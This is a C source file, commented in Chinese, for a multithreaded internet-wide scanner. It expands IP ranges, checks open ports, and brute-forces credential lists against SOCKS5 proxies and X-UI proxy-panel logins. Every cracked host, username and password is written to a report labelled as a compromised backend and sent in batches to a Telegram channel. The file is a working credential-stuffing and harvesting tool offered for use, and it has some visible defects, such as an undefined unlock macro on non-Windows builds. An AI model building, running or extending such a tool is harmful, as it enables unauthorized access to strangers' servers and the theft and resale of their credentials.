#include "saia.h"

static volatile int running_threads = 0;
#ifdef _WIN32
static HANDLE lock_stats;
static HANDLE lock_file;
#define MUTEX_LOCK(x) WaitForSingleObject(x, INFINITE)
#define MUTEX_UNLOCK(x) ReleaseMutex(x)
#define MUTEX_INIT(x) x = CreateMutex(NULL, FALSE, NULL)
#else
static pthread_mutex_t lock_stats = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t lock_file = PTHREAD_MUTEX_INITIALIZER;
#define MUTEX_LOCK(x) pthread_mutex_lock(&x)
#endif

static char saia_tg_batch_buffer[4096] = "";
static int saia_tg_batch_count = 0;

// 初始化锁
void init_locks() {
    #ifdef _WIN32
    MUTEX_INIT(lock_stats);
    MUTEX_INIT(lock_file);
    #endif
}

// ==================== 验证逻辑: SOCKS5 ====================

int verify_socks5(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int fd = socket_create(0);
    if (fd < 0) return 0;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), timeout_ms) != 0) {
        socket_close(fd);
        return 0;
    }
    
    // 1. 初始握手
    char handshake[] = {0x05, 0x01, 0x00}; // 无认证
    if (user && pass && strlen(user) > 0 && strcmp(user, "-") != 0) {
        handshake[2] = 0x02; // 用户名密码认证
    }
    
    if (socket_send_all(fd, handshake, sizeof(handshake), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char resp[2];
    if (socket_recv_until(fd, resp, 2, NULL, timeout_ms) != 2) {
        socket_close(fd);
        return 0;
    }
    
    if (resp[0] != 0x05) {
        socket_close(fd);
        return 0;
    }
    
    // 2. 认证 (如果需要)
    if (resp[1] == 0x02) {
        if (!user || !pass || strcmp(user, "-") == 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_buf[600]; 
        int ulen = (int)strlen(user);
        int plen = (int)strlen(pass);
        if (ulen > 255) ulen = 255;
        if (plen > 255) plen = 255;
        int idx = 0;
        
        auth_buf[idx++] = 0x01; // Version
        auth_buf[idx++] = (char)ulen;
        memcpy(auth_buf + idx, user, ulen); idx += ulen;
        auth_buf[idx++] = (char)plen;
        memcpy(auth_buf + idx, pass, plen); idx += plen;
        
        if (socket_send_all(fd, auth_buf, idx, timeout_ms) < 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_resp[2];
        if (socket_recv_until(fd, auth_resp, 2, NULL, timeout_ms) != 2) {
            socket_close(fd);
            return 0;
        }
        
        if (auth_resp[1] != 0x00) { // 认证失败
            socket_close(fd);
            return 0;
        }
    } else if (resp[1] != 0x00) {
        socket_close(fd);
        return 0; // 不支持的认证方法
    }
    
    // 3. 发送CONNECT请求到 1.1.1.1:80 (Cloudflare) 进行 L7 穿透测试
    char connect_req[] = {
        0x05, 0x01, 0x00, 0x01, // VER, CMD, RSV, ATYP(IPv4)
        0x01, 0x01, 0x01, 0x01, // 1.1.1.1
        0x00, 0x50              // Port 80
    };
    
    if (socket_send_all(fd, connect_req, sizeof(connect_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char conn_resp[10];
    if (socket_recv_until(fd, conn_resp, 10, NULL, timeout_ms) < 4) {
        socket_close(fd);
        return 0;
    }
    
    if (conn_resp[1] != 0x00) {
        socket_close(fd);
        return 0; // 连接被代理拒绝
    }
    
    // 4. 发起 L7 HTTP GET 请求，确认是否真实代理成功
    const char *http_req = "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.88.1\r\nConnection: close\r\n\r\n";
    if (socket_send_all(fd, http_req, strlen(http_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }

    char http_resp[1024];
    int n = socket_recv_until(fd, http_resp, sizeof(http_resp) - 1, NULL, timeout_ms);
    socket_close(fd);

    if (n > 0) {
        http_resp[n] = '\0';
        // 只要收到任何合法 HTTP 响应就认为代理真实有效
        if (strstr(http_resp, "HTTP/1.1") || strstr(http_resp, "HTTP/1.0") ||
            strstr(http_resp, "cloudflare") || strstr(http_resp, "Cloudflare") ||
            strstr(http_resp, "301") || strstr(http_resp, "200") ||
            strstr(http_resp, "302") || strstr(http_resp, "403")) {
            return 1;
        }
    }
    return 0; // L7 返回特征不匹配，可能是伪造的 S5
}

// ==================== 验证逻辑: XUI ====================

// ==================== 验证逻辑: XUI ====================

int verify_xui(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/login", ip, port);
    
    char data[512];
    snprintf(data, sizeof(data), "username=%s&password=%s", user, pass);
    
    http_response_t *res = http_post(url, data, timeout_ms);
    if (!res) return 0;
    
    int success = 0;
    
    // 检查响应
    if (res->status_code == 200) {
        // 检查是否有 success: true 或者 Set-Cookie 即可认为是有效面板
        if (res->body && strstr(res->body, "\"success\":true")) {
            success = 1;
        } else if (res->headers && strstr(res->headers, "Set-Cookie")) {
            success = 1;
        } else if (res->body && strstr(res->body, "X-UI")) {
            // 有些旧版本即使返回了200，账号密码不对也能看到登录页特征，需要谨慎
            // 但如果带Set-Cookie基本确真
        }
    }
    
    http_response_free(res);
    return success;
}

// ==================== 多线程调度 ====================

// 线程参数
typedef struct {
    char ip[64];
    uint16_t port;
    credential_t *creds;
    size_t cred_count;
    int work_mode;
} worker_arg_t;

// 工作线程函数
#ifdef _WIN32
unsigned __stdcall worker_thread(void *arg) {
#else
void *worker_thread(void *arg) {
#endif
    worker_arg_t *task = (worker_arg_t *)arg;
    int found = 0;
    (void)found; /* suppress unused-variable warning */
    
    // 更新扫描统计
    MUTEX_LOCK(lock_stats);
    g_state.total_scanned++;
    MUTEX_UNLOCK(lock_stats);
    
    // 1. 端口连通性检查
    int fd = socket_create(0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(task->port);
    inet_pton(AF_INET, task->ip, &addr.sin_addr);
    
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), 1000) != 0) {
        socket_close(fd);
        free(task);
        
        MUTEX_LOCK(lock_stats);
        running_threads--;
        MUTEX_UNLOCK(lock_stats);
        
        #ifdef _WIN32
        return 0;
        #else
        return NULL;
        #endif
    }
    socket_close(fd);
    
        // 端口开放，记录发现
    MUTEX_LOCK(lock_stats);
    g_state.total_found++;
    MUTEX_UNLOCK(lock_stats);

    /* scan_mode: 1=探索(只扫描存活), 2=探索+验真, 3=只留极品(只保留验证通过的) */
    int do_verify = (g_config.scan_mode >= SCAN_EXPLORE_VERIFY);

    /* === 探索模式: 只记录端口开放 === */
    if (!do_verify) {
        char result_line[1024];
        const char *tag = (task->work_mode == MODE_S5) ? "[S5_FOUND]" :
                          (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) ? "[XUI_FOUND]" :
                          "[PORT_OPEN]";
        snprintf(result_line, sizeof(result_line),
                 "%s %s:%d | 端口开放",
                 tag, task->ip, task->port);
        MUTEX_LOCK(lock_file);
        file_append(g_config.report_file, result_line);
        file_append(g_config.report_file, "\n");
        printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
        MUTEX_UNLOCK(lock_file);
        goto done;
    }

    /* === 验真模式 === */
    if (task->work_mode == MODE_S5) {
        for (size_t i = 0; i < task->cred_count; i++) {
            if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
                found = 1;
                
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                MUTEX_UNLOCK(lock_stats);
                
                // 记录结果
                char result_line[1024];
                snprintf(result_line, sizeof(result_line), 
                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s", 
                         task->ip, task->port, 
                         task->creds[i].username, task->creds[i].password);
                         
                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                int should_push = 0;
                char msg_to_push[5000];
                if (g_config.telegram_enabled) {
                    char tg_line[256];
                    snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
                    if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
                        strcat(saia_tg_batch_buffer, tg_line);
                        saia_tg_batch_count++;
                    }
                    int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
                    if (saia_tg_batch_count >= threshold) {
                        snprintf(msg_to_push, sizeof(msg_to_push), "<b>[S5_VERIFIED] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
                        should_push = 1;
                        saia_tg_batch_buffer[0] = '\0';
                        saia_tg_batch_count = 0;
                    }
                }
                MUTEX_UNLOCK(lock_file);
                
                if (should_push) push_telegram(msg_to_push);
                
                break; // 找到一个密码就停止
            }
        }
    } else if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) {
        /* XUI 专项 / 深度全能：遍历所有凭据 */
        for (size_t i = 0; i < task->cred_count; i++) {
            if (verify_xui(task->ip, task->port,
                           task->creds[i].username, task->creds[i].password, 3000)) {
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                MUTEX_UNLOCK(lock_stats);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[XUI_VERIFIED] [高危-后台沦陷] %s:%d | 账号:%s | 密码:%s | 登录成功",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);

                // 推送TG
                char msg[1024];
                snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>", 
                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
                push_telegram(msg);

                found = 1;
                break;
            }
        }
        /* 深度全能额外跑一遍 S5 */
        if (task->work_mode == MODE_DEEP && !found) {
            for (size_t i = 0; i < task->cred_count; i++) {
                if (verify_socks5(task->ip, task->port,
                                   task->creds[i].username, task->creds[i].password, 3000)) {
                    MUTEX_LOCK(lock_stats);
                    g_state.total_verified++;
                    MUTEX_UNLOCK(lock_stats);
                    char result_line[1024];
                    snprintf(result_line, sizeof(result_line),
                             "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
                             task->ip, task->port,
                             task->creds[i].username, task->creds[i].password);
                    MUTEX_LOCK(lock_file);
                    file_append(g_config.report_file, result_line);
                    file_append(g_config.report_file, "\n");
                    printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                    int should_push = 0;
                    char msg_to_push[5000];
                    if (g_config.telegram_enabled) {
                        char tg_line[256];
                        snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
                        if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
                            strcat(saia_tg_batch_buffer, tg_line);
                            saia_tg_batch_count++;
                        }
                        int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
                        if (saia_tg_batch_count >= threshold) {
                            snprintf(msg_to_push, sizeof(msg_to_push), "<b>[DEEP_S5] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
                            should_push = 1;
                            saia_tg_batch_buffer[0] = '\0';
                            saia_tg_batch_count = 0;
                        }
                    }
                    MUTEX_UNLOCK(lock_file);
                    
                    if (should_push) push_telegram(msg_to_push);
                    break;
                }
            }
        }
    } else if (task->work_mode == MODE_VERIFY) {
        /* 验真模式：同时尝试 XUI + S5 */
        for (size_t i = 0; i < task->cred_count; i++) {
            int ok = verify_xui(task->ip, task->port,
                                task->creds[i].username, task->creds[i].password, 3000);
            if (!ok) ok = verify_socks5(task->ip, task->port,
                                         task->creds[i].username, task->creds[i].password, 3000);
            if (ok) {
                MUTEX_LOCK(lock_stats);
                g_state.total_verified++;
                MUTEX_UNLOCK(lock_stats);
                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[VERIFIED] %s:%d | 账号:%s | 密码:%s",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                file_append(g_config.report_file, result_line);
                file_append(g_config.report_file, "\n");
                printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
                
                int should_push = 0;
                char msg_to_push[5000];
                if (g_config.telegram_enabled) {
                    char tg_line[256];
                    snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
                    if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
                        strcat(saia_tg_batch_buffer, tg_line);
                        saia_tg_batch_count++;
                    }
                    int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
                    if (saia_tg_batch_count >= threshold) {
                        snprintf(msg_to_push, sizeof(msg_to_push), "<b>[VERIFIED] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
                        should_push = 1;
                        saia_tg_batch_buffer[0] = '\0';
                        saia_tg_batch_count = 0;
                    }
                }
                MUTEX_UNLOCK(lock_file);
                
                if (should_push) push_telegram(msg_to_push);
                
                break;
            }
        }
    }

done:
    
    free(task);
    
    MUTEX_LOCK(lock_stats);
    running_threads--;
    MUTEX_UNLOCK(lock_stats);
    
    #ifdef _WIN32
    return 0;
    #else
    return NULL;
    #endif
}

// 启动扫描 — 流式展开 IP 段，逐个投喂线程池（对齐 DEJI.py iter_expanded_targets 逻辑）
void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *creds, size_t cred_count, uint16_t *ports, size_t port_count) {
    init_locks();
    printf("开始扫描... 总节点: %zu, 总端口: %zu\n", node_count, port_count);
    
    size_t node_idx = 0;
    
    while (g_running && node_idx < node_count) {
        // 压背控制
        if (g_config.backpressure.enabled) {
            backpressure_update(&g_config.backpressure);
            if (backpressure_should_throttle(&g_config.backpressure)) {
                saia_sleep(1000);
                continue;
            }
        }
        
        // 检查并发数
        MUTEX_LOCK(lock_stats);
        int current = running_threads;
        MUTEX_UNLOCK(lock_stats);
        
        if (current >= g_config.threads) {
            saia_sleep(100);
            continue;
        }
        
        // 创建任务
        for (size_t p = 0; p < port_count; p++) {
            worker_arg_t *arg = (worker_arg_t *)malloc(sizeof(worker_arg_t));
            strncpy(arg->ip, nodes[node_idx], sizeof(arg->ip) - 1);
            arg->port = ports[p];
            arg->creds = creds;
            arg->cred_count = cred_count;
            arg->work_mode = g_config.mode;
            
            MUTEX_LOCK(lock_stats);
            running_threads++;
            MUTEX_UNLOCK(lock_stats);
            
            #ifdef _WIN32
            _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
            #else
            pthread_t tid;
            pthread_create(&tid, NULL, worker_thread, arg);
            pthread_detach(tid);
            #endif
        }
        
        node_idx++;
        
        // 进度显示 (每 10 个节点或最后一个刷新一次)
        if (node_idx % 10 == 0 || node_idx == node_count) {
            MUTEX_LOCK(lock_stats);
            int rt = running_threads;
            uint64_t scanned = g_state.total_scanned;
            uint64_t found   = g_state.total_found;
            MUTEX_UNLOCK(lock_stats);
            printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
                   C_CYAN, C_RESET, node_idx, node_count, rt,
                   (unsigned long long)scanned,
                   (unsigned long long)found,
                   C_RESET);
            fflush(stdout);
        }
    }
    
    // 等待剩余线程
    while (1) {
        MUTEX_LOCK(lock_stats);
        int remaining = running_threads;
        MUTEX_UNLOCK(lock_stats);
        if (remaining <= 0) break;
        saia_sleep(500);
    }
    
    printf("\n扫描结束\n");
}

/*
 * scanner_start_streaming: 流式扫描 — 接受原始未展开的行列表，
 * 逐行调用 expand_ip_range 展开 IP 段，对每个展开后的 IP 投喂到线程池,
 * 展开完一行后立即释放该行的展开结果，内存占用极小。
 * 对应 DEJI.py 的 iter_expanded_targets + asyncio.Queue 机制。
 */
void scanner_start_streaming(char **raw_lines, size_t raw_count,
                             credential_t *creds, size_t cred_count,
                             uint16_t *ports, size_t port_count) {
    init_locks();

    /* 快速估算总目标数 — 不做真正展开，只算数目 */
    size_t est_total = 0;
    for (size_t i = 0; i < raw_count; i++) {
        if (!raw_lines[i] || !*raw_lines[i] || *raw_lines[i] == '#') continue;
        est_total += estimate_expanded_count(raw_lines[i]);
    }
    printf("开始扫描... 预估目标: %zu, 总端口: %zu\n", est_total, port_count);

    size_t fed_count = 0;

    for (size_t li = 0; li < raw_count && g_running; li++) {
        const char *line = raw_lines[li];
        if (!line || !*line || *line == '#') continue;

        /* 展开当前行 */
        char **expanded = NULL;
        size_t exp_n = 0;
        if (expand_ip_range(line, &expanded, &exp_n) != 0 || !expanded || exp_n == 0) {
            expanded = (char **)malloc(sizeof(char *));
            expanded[0] = strdup(line);
            exp_n = 1;
        }

        /* 逐个投喂 */
        for (size_t ei = 0; ei < exp_n && g_running; ei++) {
            const char *ip = expanded[ei];

            /* 对当前 IP 的每个端口创建线程 — 每个端口前都检查容量 */
            for (size_t p = 0; p < port_count && g_running; p++) {
                /* 等待线程池有空位 */
                while (g_running) {
                    if (g_config.backpressure.enabled) {
                        backpressure_update(&g_config.backpressure);
                        if (backpressure_should_throttle(&g_config.backpressure)) {
                            saia_sleep(200);
                            continue;
                        }
                    }
                    MUTEX_LOCK(lock_stats);
                    int cur = running_threads;
                    MUTEX_UNLOCK(lock_stats);
                    if (cur < g_config.threads) break;
                    saia_sleep(5); /* 快速轮询 */
                }
                if (!g_running) break;

                worker_arg_t *arg = (worker_arg_t *)malloc(sizeof(worker_arg_t));
                strncpy(arg->ip, ip, sizeof(arg->ip) - 1);
                arg->ip[sizeof(arg->ip) - 1] = '\0';
                arg->port = ports[p];
                arg->creds = creds;
                arg->cred_count = cred_count;
                arg->work_mode = g_config.mode;

                MUTEX_LOCK(lock_stats);
                running_threads++;
                MUTEX_UNLOCK(lock_stats);

                #ifdef _WIN32
                _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
                #else
                pthread_t tid;
                pthread_create(&tid, NULL, worker_thread, arg);
                pthread_detach(tid);
                #endif
            }

            fed_count++;
            if (fed_count % 500 == 0 || fed_count == est_total) {
                MUTEX_LOCK(lock_stats);
                int rt = running_threads;
                uint64_t scanned = g_state.total_scanned;
                uint64_t found   = g_state.total_found;
                MUTEX_UNLOCK(lock_stats);
                printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
                       C_CYAN, C_RESET, fed_count, est_total, rt,
                       (unsigned long long)scanned,
                       (unsigned long long)found,
                       C_RESET);
                fflush(stdout);
            }
        }

        /* 释放本行展开结果 */
        for (size_t j = 0; j < exp_n; j++) free(expanded[j]);
        free(expanded);
    }

    /* 等待剩余线程 */
    while (1) {
        MUTEX_LOCK(lock_stats);
        int remaining = running_threads;
        MUTEX_UNLOCK(lock_stats);
        if (remaining <= 0) break;
        saia_sleep(200);
    }

    printf("\n扫描结束\n");
}

// 占位符接口实现
int scanner_init(void) { return 0; }
void scanner_cleanup(void) { }
// scanner_run 已经被新的逻辑替代，这里仅保留兼容性
int scanner_run(scan_target_t *target) { 
    (void)target;
    return 0; 
}
int scanner_scan_port(ip_port_t addr, scan_result_t *result) { (void)addr; (void)result; return 0; }
int scanner_scan_callback(scan_result_t *result, void *user_data) { (void)result; (void)user_data; return 0; }
